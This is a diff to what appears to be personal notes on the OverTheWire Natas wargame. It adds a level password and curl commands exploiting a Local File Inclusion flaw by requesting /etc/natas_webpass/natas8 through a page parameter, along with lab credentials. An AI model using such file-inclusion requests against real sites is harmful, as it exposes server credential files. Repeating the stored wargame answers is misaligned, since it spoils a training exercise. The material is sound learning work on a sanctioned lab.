@@ -40,3 +40,8 @@ command ==> curl -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.nata
 command ==> curl -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=1" http://natas6.natas.labs.overthewire.org
 
 
+level 8		natas8			xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+note: This level is a classic example of a Local File Inclusion (LFI) vulnerability. The website is using a URL parameter (?page=...) to load content from a file on the server's file system.
+command ==> curl -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/
+command ==> curl -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
